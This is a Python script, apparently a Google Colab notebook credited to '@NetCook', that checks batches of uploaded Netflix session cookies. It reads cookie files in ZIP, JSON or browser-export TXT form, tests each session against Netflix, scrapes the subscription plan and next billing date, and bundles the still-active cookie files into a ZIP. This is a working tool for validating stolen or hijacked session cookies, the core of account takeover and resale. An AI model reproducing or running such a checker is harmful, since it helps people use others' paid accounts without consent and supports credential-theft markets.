import os
import json
import shutil
import zipfile
import requests
import pandas as pd
from pyunpack import Archive
from google.colab import files
from tabulate import tabulate
from bs4 import BeautifulSoup
from datetime import datetime
from googletrans import Translator
from netcook import netflix_url
from IPython.display import HTML

translator = Translator()

def delete_and_recreate_folders():
    folders = ['temp_0', 'temp_1', 'temp_2']
    for folder in folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)
        os.makedirs(folder)

def check_cookies_valid_netflix(cookies):
    response = requests.get(netflix_url, cookies=cookies, allow_redirects=False)
    return "Active" if response.status_code == 200 else "Expired"

def read_cookies(file):
    cookies = {}
    is_netflix_cookie = False
    if file.endswith('.json'):
        with open(file, 'r') as f:
            cookies_json = json.load(f)
            for cookie in cookies_json:
                if 'name' in cookie and 'value' in cookie and 'domain' in cookie:
                    domain = cookie['domain']
                    if 'netflix.com' in domain or 'www.netflix.com' in domain or '.netflix.com' in domain:
                        name = cookie['name']
                        value = cookie['value']
                        cookies[name] = value
                        is_netflix_cookie = True
    elif file.endswith('.txt'):
        with open(file, 'r', encoding='utf-8') as f:
            for line in f:
                parts = line.strip().split('\t')
                if len(parts) >= 7:
                    domain = parts[0].strip()
                    if 'netflix.com' in domain or 'www.netflix.com' in domain or '.netflix.com' in domain:
                        name = parts[5].strip()
                        value = parts[6].strip()
                        cookies[name] = value
                        is_netflix_cookie = True

    if not is_netflix_cookie:
        return None, False
    
    return cookies, True

def extract_plan_and_billing_info(content):
    plan_mapping = {
        'Mobile': 'Mobile',
        'Basic': 'Basic',
        'Standard': 'Standard',
        'Premium': 'Premium'
    }

    parsed_html = BeautifulSoup(content, 'html.parser')
    plan_name_div = parsed_html.find('div', attrs={'data-uia': 'plan-name'})
    next_cycle_div = parsed_html.find('div', attrs={'data-uia': 'streaming-next-cycle'})

    plan_name_text = plan_name_div.text.split('-')[0] if plan_name_div else '[Not found]'
    next_cycle_text = next_cycle_div.text if next_cycle_div else '[Not found]'

    plan_name_en = translator.translate(plan_name_text, src='auto', dest='en').text
    next_cycle_en = translator.translate(next_cycle_text, src='auto', dest='en').text

    def convert_date(date_str):
        formats = ['%B %d, %Y', '%d %B %Y', '%d. %B %Y', '%B %d, %Y.', '%B %d %Y']
        for date_format in formats:
            try:
                return datetime.strptime(date_str, date_format).strftime('%Y-%m-%d')
            except ValueError:
                continue
        return date_str

    plan_name_mapped = plan_mapping.get(plan_name_en, '[Not found]')

    if '[Not found]' in next_cycle_en:
        next_cycle_final = '[Not found]'
    else:
        next_cycle_final = convert_date(next_cycle_en)

    return "Active", plan_name_mapped, next_cycle_final

def extract_and_process_cookies(file, output_folder):
    result_list = []
    total_files = 0
    expired_cookies = 0
    invalid_files = 0
    invalid_cookies_files = 0

    if file.endswith('.zip'):
        Archive(file).extractall(output_folder)

        active_files = []
        for root, dirs, files in os.walk(output_folder):
            for file_name in files:
                total_files += 1
                file_path = os.path.join(root, file_name)
                if not (file_path.endswith('.json') or file_path.endswith('.txt')):
                    print(f"Invalid file format found: {file_name}. Skipping this file...")
                    invalid_files += 1
                    continue
                cookies, is_netflix_cookie = read_cookies(file_path)
                if not is_netflix_cookie:
                    print(f"Invalid cookies file found: {file_name}. Skipping this file...")
                    invalid_cookies_files += 1
                    continue
                cookies_status = check_cookies_valid_netflix(cookies)
                plan = '[Not checked]'
                next_billing_date = '[Not checked]'
                if cookies_status == 'Active':
                    active_files.append(file_path)
                    response = requests.get(netflix_url, cookies=cookies, allow_redirects=False)
                    if response.status_code == 200:
                        cookies_status, plan, next_billing_date = extract_plan_and_billing_info(response.content)
                    result_list.append([file_name, cookies_status, plan, next_billing_date])
                else:
                    expired_cookies += 1

        if active_files:
            with zipfile.ZipFile('temp_2/active.zip', 'w') as active_zip:
                for active_file in active_files:
                    active_zip.write(active_file, os.path.basename(active_file))
    else:
        total_files += 1
        if not (file.endswith('.json') or file.endswith('.txt')):
            print(f"Invalid file format found: {file}. Skipping this file...")
            invalid_files += 1
            return

        cookies, is_netflix_cookie = read_cookies(file)
        if not is_netflix_cookie:
            print(f"Invalid cookies file found: {os.path.basename(file)}. Skipping this file...")
            invalid_cookies_files += 1
            return
        cookies_status = check_cookies_valid_netflix(cookies)
        plan = '[Not checked]'
        next_billing_date = '[Not checked]'
        if cookies_status == 'Active':
            response = requests.get(netflix_url, cookies=cookies, allow_redirects=False)
            if response.status_code == 200:
                cookies_status, plan, next_billing_date = extract_plan_and_billing_info(response.content)
            result_list.append([os.path.basename(file), cookies_status, plan, next_billing_date])
            with zipfile.ZipFile('temp_2/active.zip', 'w') as active_zip:
                active_zip.write(file, os.path.basename(file))
        else:
            expired_cookies += 1

    def custom_sort(item):
        plan_order = {'Basic': 1, 'Mobile': 2, 'Premium': 3, 'Standard': 4, '[Not found]': 5}
        return plan_order.get(item[2], 6)

    result_list.sort(key=custom_sort)

    result_list = [[i+1] + row for i, row in enumerate(result_list)]

    if result_list:
        print("\n")
        print(tabulate(result_list, headers=["No", "File Name", "Cookies Status", "Plan", "Next Billing Date"], tablefmt="psql", colalign=("center", "left", "center", "center", "center")))

    active_cookies = len(result_list)

    summary_table = [["Files", total_files], ["Active Files", active_cookies], ["Expired Files", expired_cookies], ["Invalid Format Files", invalid_files], ["Invalid Cookies Files", invalid_cookies_files]]
    print(tabulate(summary_table, headers=["Description", "Count"], tablefmt="psql", colalign=("left", "center")))

    if active_cookies > 0:
        print(f"\ncookies file active save to directory temp_2/active.zip\n")

folders = ['temp_0', 'temp_1', 'temp_2']
for folder in folders:
    if not os.path.exists(folder):
        os.makedirs(folder)

def checked_cookies(netflix_url):
    while True:
        delete_and_recreate_folders()
        
        print("\033[1mSCRIPT by. @NetCook\033[0m")
        print("\033[1mapp2.dn-project.biz.id\033[0m")
        print("\nMenu:")
        print("1. Check Cookies Netlix")
        print("2. Exit\n")

        choice = input("Enter your choice (1/2): ")

        if choice == '1':
            print("Please upload a ZIP, JSON, or TXT file for Netflix cookies:\n")

            uploaded_files = files.upload()
            file_names = list(uploaded_files.keys())
            file_name = file_names[0] if file_names else None

            if file_name:
                temp_path = os.path.join('temp_1', file_name)
                content = uploaded_files[file_name]

                with open(temp_path, 'wb') as f:
                    f.write(content)

                extract_and_process_cookies(temp_path, 'temp_0')

            else:
                print("No file uploaded.\n")

        elif choice == '2':
            print("Thank you for using this script ❤︎❤︎❤︎.")
            print("Support me : https://saweria.co/netcook")
            break
        else:
            print("Invalid choice. Please enter a valid choice.\n")